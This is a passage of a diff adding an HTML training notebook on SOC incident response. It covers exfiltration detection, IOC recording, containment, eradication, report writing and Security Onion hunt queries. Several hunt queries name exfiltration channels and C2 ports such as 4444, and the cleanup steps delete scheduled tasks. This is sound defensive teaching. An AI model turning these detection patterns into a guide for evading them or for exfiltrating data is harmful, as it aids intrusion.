+        <tr><td><code>event.dataset</code></td><td>zeek.ftp</td><td>FTP control channel events</td></tr>
+        <tr><td><code>ftp.command</code></td><td>STOR</td><td>File upload from internal host to external FTP server</td></tr>
+        <tr><td><code>ftp.data_channel.is_orig</code></td><td>true</td><td>Data originated from internal host = <strong>OUTBOUND exfiltration</strong></td></tr>
+        <tr><td><code>zeek.files</code></td><td>Correlated by FUID</td><td>File hash available if missing_bytes = 0</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <pre><code><span class="cm"># Hunt: FTP data transfers from compromised host</span>
+event.dataset: "zeek.ftp" AND source.ip: "10.0.7.14" AND ftp.command: "STOR"
+
+<span class="cm"># Hunt: File hashes for FTP transfers</span>
+event.dataset: "zeek.files" AND source.ip: "10.0.7.14" AND network.protocol: "ftp-data"</code></pre>
+
+  <h3>Other Exfiltration Channels</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Channel</th><th>Detection Method</th><th>Hunt Query Approach</th></tr></thead>
+      <tbody>
+        <tr><td><strong>HTTP POST</strong></td><td>Large request body to external IP in zeek.http</td><td><code>event.dataset: "zeek.http" AND http.request.method: "POST" AND destination.ip: NOT 10.0.0.0/8</code></td></tr>
+        <tr><td><strong>DNS tunneling</strong></td><td>Unusually long queries, high query frequency to single domain</td><td><code>event.dataset: "zeek.dns" AND dns.question.name: *exfil* (or long encoded subdomains)</code></td></tr>
+        <tr><td><strong>SMB to external</strong></td><td>SMB traffic leaving the network — should never happen</td><td><code>event.dataset: "zeek.smb_files" AND destination.ip: NOT 10.0.0.0/8</code></td></tr>
+        <tr><td><strong>Raw TCP</strong></td><td>No protocol header, unusual port, large byte count in zeek.conn</td><td><code>event.dataset: "zeek.conn" AND NOT network.protocol: * AND destination.bytes: > 1000000</code></td></tr>
+        <tr><td><strong>Tool staging</strong></td><td>WinSCP, Wireshark, 7zip accessed from DC share</td><td>zeek.smb_files showing .exe access from admin shares</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>PCAP Analysis Workflow</h3>
+  <ol>
+    <li><strong>Get Community ID</strong> from zeek.files or zeek.conn for the transfer of interest</li>
+    <li><strong>Search PCAP</strong> in Security Onion using the Community ID</li>
+    <li><strong>Download PCAP</strong> to an isolated analysis VM — never open on production systems</li>
+    <li><strong>Open in Wireshark</strong> on the isolated VM</li>
+    <li><strong>Export objects</strong>: File → Export Objects → HTTP (or SMB, or FTP-DATA)</li>
+    <li><strong>Hash extracted files</strong> and check VirusTotal</li>
+    <li><strong>Document</strong>: filename, hash, size, source, destination, timestamp</li>
+  </ol>
+
+</article>
+</template>
+
+<!-- ══════════════════════════ TOPIC 7: IOC Documentation ══════════════════════════ -->
+<template id="tpl-07-ioc-documentation">
+<article class="topic">
+  <h2>07 &middot; IOC Collection &amp; Documentation</h2>
+
+  <p>Throughout the investigation, you build an IOC (Indicator of Compromise) registry. Every finding gets documented with enough detail to be actionable for blocking, hunting, and reporting.</p>
+
+  <h3>IOC Types and How to Capture Each</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>IOC Type</th><th>What to Record</th><th>Where to Find It</th></tr></thead>
+      <tbody>
+        <tr><td><strong>IP Addresses</strong></td><td>Port, direction (inbound/outbound), protocol, first seen, last seen</td><td>zeek.conn, Suricata alerts, firewall logs</td></tr>
+        <tr><td><strong>Domain Names</strong></td><td>Resolution (IP it resolved to), NXDOMAIN vs resolved, registrar, domain age</td><td>zeek.dns, passive DNS, WHOIS lookup</td></tr>
+        <tr><td><strong>File Hashes</strong></td><td>Always collect BOTH MD5 AND SHA256 — check both on VirusTotal</td><td>zeek.files, Sysmon EID 1, EDR telemetry</td></tr>
+        <tr><td><strong>File Names</strong></td><td>Full path, parent process that created it, legitimate name vs masquerade</td><td>Sysmon EID 11, zeek.smb_files</td></tr>
+        <tr><td><strong>User Accounts</strong></td><td>Compromised account name, logon type, session ID, actions performed</td><td>Windows Security log, Sysmon, zeek.kerberos</td></tr>
+        <tr><td><strong>Registry Keys</strong></td><td>Persistence locations: Run keys, services, scheduled tasks</td><td>Sysmon EID 12/13, registry hive export</td></tr>
+        <tr><td><strong>Network Signatures</strong></td><td>C2 keep-alive strings, user agents, URL patterns, JA3 hashes</td><td>zeek.http, zeek.ssl, Suricata payload</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>VirusTotal Workflow</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>VT Result</th><th>Action</th><th>Documentation</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Confirmed malicious</strong> (10+ detections)</td><td>Save full VT screenshot as evidence</td><td>Include detection count, family name, first submission date</td></tr>
+        <tr><td><strong>Suspicious</strong> (1-9 detections)</td><td>Save VT screenshot with detection count</td><td>Note which engines detected it, check community comments</td></tr>
+        <tr><td><strong>Clean</strong> (0 detections)</td><td>Note "0/94 VT [date]" in report</td><td>No screenshot needed — just the text note</td></tr>
+        <tr><td><strong>No results</strong></td><td>File is unknown — treat as suspicious</td><td>Upload to VT if authorized, or note "hash not found on VT"</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="callout warn">
+    <strong>Always check BOTH hash types.</strong> MD5 has known collision weaknesses. Some older VT entries only index MD5, while newer entries use SHA256. Search both to ensure complete coverage.
+  </div>
+
+  <h3>Evidence Documentation Standard</h3>
+  <p>Every finding needs these fields documented:</p>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Field</th><th>Purpose</th><th>Example</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Timestamp</strong></td><td>When the event occurred (UTC)</td><td>2024-03-19T14:32:09Z</td></tr>
+        <tr><td><strong>Data Source</strong></td><td>Which dataset provided the evidence</td><td>zeek.http, Sysmon EID 1, Suricata alert</td></tr>
+        <tr><td><strong>Field Name</strong></td><td>Specific field that contains the IOC</td><td>destination.ip, file.hash.sha256</td></tr>
+        <tr><td><strong>Value</strong></td><td>The actual indicator</td><td>198.51.100.23, abc123def456...</td></tr>
+        <tr><td><strong>Analyst Conclusion</strong></td><td>What this evidence means</td><td>"Confirmed C2 server — HTTP beaconing at 60s intervals"</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Correlation Fields</h3>
+  <ul>
+    <li><strong>Community ID</strong> — links network events across all Zeek datasets for the same flow</li>
+    <li><strong>FUID</strong> — links file events to specific file transfers in zeek.files</li>
+    <li><strong>Entity ID</strong> — links Sysmon process events to network connections (EID 1 → EID 3)</li>
+  </ul>
+
+</article>
+</template>
+
+<!-- ══════════════════════════ TOPIC 8: Containment Decision ══════════════════════════ -->
+<template id="tpl-08-containment-decision">
+<article class="topic">
+  <h2>08 &middot; Phase 6 — Containment Decision</h2>
+
+  <p>Containment is the most consequential decision in incident response. Too early and you lose evidence. Too late and the attacker extends their access. This section covers when to pull the trigger and how to do it right.</p>
+
+  <h3>Escalation Triggers — Escalate Immediately When:</h3>
+  <div class="callout warn">
+    <strong>Any of these conditions require immediate escalation to incident commander / management:</strong>
+  </div>
+  <ul>
+    <li><strong>Domain Controller confirmed compromised</strong> — attacker has keys to the kingdom</li>
+    <li><strong>Kerberos TGT obtained by attacker</strong> — full domain authentication capability</li>
+    <li><strong>Active C2 on multiple hosts</strong> — attacker is actively operating</li>
+    <li><strong>Password hashes confirmed exfiltrated</strong> — credential compromise across the domain</li>
+    <li><strong>Self-propagating malware on network share</strong> — spreading without attacker interaction</li>
+    <li><strong>Human operator confirmed present</strong> — interactive attack (not just automated malware)</li>
+  </ul>
+
+  <h3>Containment Priority Order</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Priority</th><th>Target</th><th>Reasoning</th></tr></thead>
+      <tbody>
+        <tr><td><strong>1</strong></td><td>Authentication infrastructure (Domain Controller)</td><td>Cuts attacker from domain auth — prevents new ticket issuance</td></tr>
+        <tr><td><strong>2</strong></td><td>Primary compromised host</td><td>Stops C2 communication and prevents further lateral movement</td></tr>
+        <tr><td><strong>3</strong></td><td>Secondary hosts in order of C2 activity</td><td>Contain in order of confirmed C2 beaconing, not just suspicion</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Pre-Isolation Capture Requirements</h3>
+  <div class="callout lab">
+    <strong>MUST complete these before isolating any host:</strong>
+  </div>
+  <ol>
+    <li><strong>Memory (RAM) capture</strong> — use <code>winpmem</code> for Windows — captures injected code, LSASS credentials in memory, active network connections</li>
+    <li><strong>Full process list</strong> with PIDs, PPIDs, hashes:
+      <pre><code>netstat -ano > C:\IR\netstat.txt
+tasklist /v > C:\IR\tasklist.txt
+wmic process get ProcessId,ParentProcessId,Name,ExecutablePath,CommandLine > C:\IR\processes.txt</code></pre>
+    </li>
+    <li><strong>Registry hive export</strong> — Run keys, Services, scheduled tasks:
+      <pre><code>reg export HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run C:\IR\run_keys.reg
+schtasks /query /fo CSV /v > C:\IR\scheduled_tasks.csv</code></pre>
+    </li>
+    <li><strong>Windows Event Log export</strong> — Security, System, Application, Sysmon:
+      <pre><code>wevtutil epl Security C:\IR\Security.evtx
+wevtutil epl System C:\IR\System.evtx
+wevtutil epl Microsoft-Windows-Sysmon/Operational C:\IR\Sysmon.evtx</code></pre>
+    </li>
+    <li><strong>VM snapshot</strong> after memory capture — preserves disk state at time of isolation</li>
+  </ol>
+
+  <h3>Business Impact Communication</h3>
+  <p>How to justify containment downtime to management:</p>
+  <ul>
+    <li>Frame as: <strong>"Cost of downtime vs. cost of continued breach"</strong></li>
+    <li>Active C2 = attacker still present = active data loss in progress</li>
+    <li>Domain Controller compromise = attacker can impersonate any user at any time</li>
+    <li>Every minute of delay = more data exfiltrated, more hosts compromised, more credentials stolen</li>
+  </ul>
+
+</article>
+</template>
+
+<!-- ══════════════════════════ TOPIC 9: Eradication & Recovery ══════════════════════════ -->
+<template id="tpl-09-eradication-recovery">
+<article class="topic">
+  <h2>09 &middot; Phase 7 — Eradication &amp; Recovery</h2>
+
+  <h3>Eradication Checklist</h3>
+  <ol>
+    <li><strong>Remove malware</strong> from all confirmed file system locations</li>
+    <li><strong>Remove malware from network shares</strong> — check mapped drives and admin shares</li>
+    <li><strong>Check and remove malicious scheduled tasks</strong>:
+      <pre><code>schtasks /query /fo LIST /v | findstr /i "taskname actions"
+<span class="cm"># Delete malicious task:</span>
+schtasks /delete /tn "MaliciousTask" /f</code></pre>
+    </li>
+    <li><strong>Audit all Run keys and services</strong> for persistence:
+      <pre><code>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+sc query state= all | findstr /i "SERVICE_NAME DISPLAY_NAME"</code></pre>
+    </li>
+    <li><strong>Restart hosts</strong> to clear memory-resident injections (CreateRemoteThread artifacts)</li>
+    <li><strong>Reset KRBTGT account password TWICE</strong> with a 10+ hour gap between resets (invalidates all existing Kerberos tickets including Golden Tickets)</li>
+    <li><strong>Reset all confirmed compromised accounts</strong></li>
+    <li><strong>Rebuild from clean backup</strong> if available — identify pre-compromise backup date as restore point</li>
+  </ol>
+
+  <div class="callout warn">
+    <strong>Memory injection note:</strong> CreateRemoteThread artifacts are memory-only — they do NOT survive a reboot. However, persistence mechanisms (scheduled tasks, registry Run keys, services) WILL re-inject after reboot. <strong>Must remove persistence BEFORE rebooting</strong> or the injection returns.
+  </div>
+
+  <h3>Recovery Validation Before Reconnecting</h3>
+  <ol>
+    <li><strong>Full vulnerability scan</strong> on rebuilt hosts — ensure patches are current</li>
+    <li><strong>Verify no C2 connections</strong> after reconnection — monitor zeek.conn for beaconing to known-bad IPs</li>
+    <li><strong>Monitor for 24-48 hours</strong> before declaring clean — watch for re-infection indicators</li>
+    <li><strong>Identify pre-compromise backup date</strong> as restore point — do not restore from a backup taken after compromise began</li>
+  </ol>
+
+  <h3>Recovery Monitoring Queries</h3>
+  <pre><code><span class="cm"># Monitor rebuilt host for C2 beaconing after reconnection</span>
+source.ip: "10.0.7.14" AND destination.ip: NOT 10.0.0.0/8 | sort @timestamp
+
+<span class="cm"># Check for any new Suricata alerts from rebuilt host</span>
+event.module: "suricata" AND source.ip: "10.0.7.14"
+
+<span class="cm"># Watch for process creation of known-bad executables</span>
+event.dataset: "sysmon" AND event.code: "1" AND host.ip: "10.0.7.14"</code></pre>
+
+</article>
+</template>
+
+<!-- ══════════════════════════ TOPIC 10: Report Writing ══════════════════════════ -->
+<template id="tpl-10-report-writing">
+<article class="topic">
+  <h2>10 &middot; Phase 8 — Report Writing</h2>
+
+  <p>The incident report is the permanent record of what happened, what was found, and what was done. A well-written report demonstrates analytical rigor and provides value for future investigations.</p>
+
+  <h3>Report Structure</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Section</th><th>Content</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Header</strong></td><td>Subject, Date, Reported By (your name)</td></tr>
+        <tr>
+          <td><strong>Section 1: Incident Summary</strong></td>
+          <td>
+            <ul>
+              <li>Brief Description — one paragraph overview</li>
+              <li>Discovery time — when the alert fired</li>
+              <li>Impact time — when the compromise began (may differ from discovery)</li>
+              <li>Severity — Critical / High / Medium / Low with justification</li>
+            </ul>
+          </td>
+        </tr>
+        <tr>
+          <td><strong>Section 2: Incident Details</strong></td>
+          <td>
+            <ul>
+              <li>Affected Systems — list every compromised host with IP and role</li>
+              <li>Root Cause — how the attacker got in (phishing, exploit, credentials)</li>
+              <li>Impact — Business (downtime, data loss), Reputation, Compliance (PCI, HIPAA)</li>
+              <li>Evidence — detailed findings with timestamps and data sources</li>
+            </ul>
+          </td>
+        </tr>
+        <tr><td><strong>Section 3: Attachments</strong></td><td>VirusTotal screenshots, timeline table, IOC list, PCAP references</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Timeline Table Format</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Timestamp (UTC)</th><th>Source</th><th>Destination</th><th>Alert / Evidence</th><th>Attack Stage</th><th>What Happened</th><th>Security Impact</th></tr></thead>
+      <tbody>
+        <tr><td>14:32:00</td><td>198.51.100.23</td><td>10.0.7.14:443</td><td>Suricata: ET MALWARE C2</td><td>C2</td><td>HTTP beacon to C2 server</td><td>Active remote control established</td></tr>
+        <tr><td>14:35:12</td><td>10.0.7.14</td><td>10.0.1.1:3389</td><td>zeek.rdp</td><td>Lateral Movement</td><td>RDP to Domain Controller</td><td>Attacker accessed auth infrastructure</td></tr>
+        <tr><td>14:41:30</td><td>10.0.7.14</td><td>203.0.113.8:21</td><td>zeek.ftp STOR</td><td>Exfiltration</td><td>File uploaded to external FTP</td><td>Confirmed data exfiltration</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Writing Style Guidance</h3>
+  <ul>
+    <li><strong>Write in your own voice</strong> — not corporate boilerplate. Be direct and specific.</li>
+    <li><strong>Be specific</strong> — include IPs, timestamps, exact alert names. "A suspicious connection was observed" is useless. "10.0.7.14 connected to 198.51.100.23:443 at 14:32:00 UTC with HTTP beaconing at 60-second intervals" is useful.</li>
+    <li><strong>Explain the significance</strong> of each finding — "This means the attacker had remote control of the workstation for at least 2 hours before detection."</li>
+    <li><strong>Bullet points</strong> for evidence lists, <strong>prose</strong> for analysis and conclusions</li>
+    <li><strong>Timeline table</strong> for chronological event documentation</li>
+  </ul>
+
+  <h3>What NOT to Do in Reports</h3>
+  <ul>
+    <li>Do not write vague summaries without specific data — every claim needs evidence</li>
+    <li>Do not list findings without explaining their significance — "so what?" is the reader's question</li>
+    <li>Do not skip open items — document what was NOT investigated and why</li>
+    <li>Do not claim certainty about things still under investigation — use "likely", "consistent with", "evidence suggests"</li>
+    <li>Do not use passive voice to avoid responsibility — "it was determined" → "I determined based on [evidence]"</li>
+  </ul>
+
+</article>
+</template>
+
+<!-- ══════════════════════════ TOPIC 11: Hunt Queries Reference ══════════════════════════ -->
+<template id="tpl-11-so-hunt-queries">
+<article class="topic">
+  <h2>11 &middot; Security Onion — Hunt Queries Reference</h2>
+
+  <p>Reference collection of Security Onion Hunt queries organized by investigation phase. Copy and modify these for your specific investigation.</p>
+
+  <h3>Initial Triage</h3>
+  <pre><code><span class="cm"># All alerts for a specific IP</span>
+event.module: "suricata" AND (source.ip: "10.0.7.14" OR destination.ip: "10.0.7.14")
+
+<span class="cm"># All datasets for a specific IP</span>
+source.ip: "10.0.7.14" OR destination.ip: "10.0.7.14"
+
+<span class="cm"># All events in a specific time window</span>
+@timestamp >= "2024-03-19T14:00:00" AND @timestamp <= "2024-03-19T16:00:00"
+
+<span class="cm"># All C2 traffic by port</span>
+destination.port: 4444 OR destination.port: 8080 OR destination.port: 9001</code></pre>
+
+  <h3>Network Investigation</h3>
+  <pre><code><span class="cm"># All file transfers with hashes</span>
+event.dataset: "zeek.files" AND (source.ip: "10.0.7.14" OR destination.ip: "10.0.7.14")
+
+<span class="cm"># FTP exfiltration detection</span>
+event.dataset: "zeek.ftp" AND source.ip: "10.0.7.14"
+
+<span class="cm"># DNS tunneling detection — long queries</span>
+event.dataset: "zeek.dns" AND source.ip: "10.0.7.14" AND NOT dns.question.name: *.microsoft.com AND NOT dns.question.name: *.windows.com
+
+<span class="cm"># RDP between internal hosts</span>
+event.dataset: "zeek.rdp" AND source.ip: 10.0.0.0/8 AND destination.ip: 10.0.0.0/8
+
+<span class="cm"># SMB executable access</span>
+event.dataset: "zeek.smb_files" AND file.name: *.exe
+
+<span class="cm"># Kerberos brute force detection</span>
+event.dataset: "zeek.kerberos" AND kerberos.error_msg: "KDC_ERR_PREAUTH_FAILED"
+
+<span class="cm"># LDAP enumeration queries</span>
+event.dataset: "zeek.ldap_search" AND source.ip: "10.0.7.14"</code></pre>
+
+  <h3>Host Investigation</h3>
+  <pre><code><span class="cm"># All Sysmon events for a host in time window</span>
+event.module: "sysmon" AND host.ip: "10.0.7.14" AND @timestamp >= "2024-03-19T14:00:00"
+
+<span class="cm"># Process creation filtered by user</span>
+event.code: "1" AND winlog.event_data.User: "*jaya.kearney*"
+
+<span class="cm"># Network connections from a specific process</span>
+event.code: "3" AND process.executable: "*powershell*"
+
+<span class="cm"># CreateRemoteThread events (process injection)</span>
+event.code: "8"
+
+<span class="cm"># FileCreate in unusual locations</span>
+event.code: "11" AND file.path: (*Temp* OR *AppData* OR *ProgramData* OR *Public*)
+
+<span class="cm"># Registry Run key modifications</span>
+event.code: "13" AND registry.path: *CurrentVersion\\Run*</code></pre>
+
+  <h3>Correlation Queries</h3>
+  <pre><code><span class="cm"># Hunt by Community ID across all datasets</span>
+network.community_id: "1:abc123def456..."
+
+<span class="cm"># Hunt by FUID for file tracking</span>
+zeek.files.fuid: "FYy1234abc"
+
+<span class="cm"># Hunt by process entity_id for full process chain</span>
+process.entity_id: "{abc-123-def-456}"
+
+<span class="cm"># Exclude known-good processes (noise reduction)</span>
+event.code: "1" AND NOT process.executable: (*SDXHelper* OR *DismHost* OR *cleanmgr*)</code></pre>
+
+  <h3>Filters for Noise Reduction</h3>
+  <pre><code><span class="cm"># Exclude known-good process paths</span>
+NOT process.executable: "C:\\Windows\\System32\\svchost.exe"
+NOT process.executable: "C:\\Program Files\\*"
+
+<span class="cm"># Exclude known-good parent processes</span>
+NOT process.parent.name: "services.exe"
+NOT process.parent.name: "svchost.exe"
+
+<span class="cm"># Focus on specific compromised user</span>
+winlog.event_data.User: "*jaya.kearney*" OR user.name: "jaya.kearney"
+
+<span class="cm"># Exclude Microsoft telemetry noise</span>
+NOT destination.ip: 13.107.0.0/16 AND NOT destination.ip: 20.0.0.0/11</code></pre>
+
+</article>
+</template>
+
+<script>
+window.NOTEBOOK = {
+  title: 'SOC Investigation Workflow',
+  topics: [
+    { id: '01-picerl-overview',       badge: '01', label: 'PICERL Framework Overview'    },
+    { id: '02-alert-triage',          badge: '02', label: 'Phase 1 — Alert Triage'       },
+    { id: '03-network-investigation', badge: '03', label: 'Phase 2 — Network Investigation' },
+    { id: '04-host-investigation',    badge: '04', label: 'Phase 3 — Host Investigation' },
+    { id: '05-lateral-movement',      badge: '05', label: 'Phase 4 — Lateral Movement'   },
+    { id: '06-exfiltration-detection',badge: '06', label: 'Phase 5 — Exfiltration'       },
+    { id: '07-ioc-documentation',     badge: '07', label: 'IOC Collection & Documentation' },
+    { id: '08-containment-decision',  badge: '08', label: 'Phase 6 — Containment'        },
+    { id: '09-eradication-recovery',  badge: '09', label: 'Phase 7 — Eradication & Recovery' },
+    { id: '10-report-writing',        badge: '10', label: 'Phase 8 — Report Writing'     },
+    { id: '11-so-hunt-queries',       badge: '11', label: 'SO Hunt Queries Reference'    },
+  ]
+};
+</script>
+<script src="js/app.js"></script>
+</body>
+</html>
